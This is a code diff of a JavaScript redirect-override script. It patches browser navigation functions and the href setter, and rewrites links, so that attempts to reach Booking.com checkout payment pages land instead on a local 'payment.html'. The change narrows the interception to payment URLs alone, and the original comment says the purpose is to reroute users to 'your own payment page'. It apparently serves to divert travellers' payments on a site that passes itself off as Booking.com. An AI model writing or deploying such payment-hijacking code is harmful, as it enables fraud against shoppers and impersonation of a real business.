@@ -1,18 +1,19 @@
-// overrideRedirect.js
-
-// Block all redirects to Booking.com and reroute to your own payment page
 (function () {
   const redirectToPayment = () => {
     console.log("Redirecting to custom payment page...");
     window.location.href = "payment.html";
   };
 
-  // Intercept and override any redirect attempts to Booking.com
+  const isBlockedPaymentURL = (url) => {
+    return url.includes("booking.com/checkout/payment") || url.includes("flights.booking.com/checkout/payment");
+  };
+
+  // Intercept JS redirects
   const originalAssign = window.location.assign;
   const originalReplace = window.location.replace;
 
   window.location.assign = function (url) {
-    if (url.includes("booking.com")) {
+    if (isBlockedPaymentURL(url)) {
       redirectToPayment();
     } else {
       originalAssign.call(window.location, url);
@@ -20,17 +21,17 @@
   };
 
   window.location.replace = function (url) {
-    if (url.includes("booking.com")) {
+    if (isBlockedPaymentURL(url)) {
       redirectToPayment();
     } else {
       originalReplace.call(window.location, url);
     }
   };
 
-  // Monitor for direct changes to window.location.href
+  // Block direct href changes
   Object.defineProperty(window.location, 'href', {
     set: function (url) {
-      if (url.includes("booking.com")) {
+      if (isBlockedPaymentURL(url)) {
         redirectToPayment();
       } else {
         window.location.assign(url);
@@ -38,12 +39,13 @@
     }
   });
 
-  // Optional: Replace any booking.com <a href> links on the page
+  // Replace only payment links in <a> tags
   document.addEventListener("DOMContentLoaded", () => {
-    const links = document.querySelectorAll("a[href*='booking.com']");
+    const links = document.querySelectorAll("a[href]");
     links.forEach(link => {
-      link.href = "payment.html";
+      if (isBlockedPaymentURL(link.href)) {
+        link.href = "payment.html";
+      }
     });
   });
-
 })();
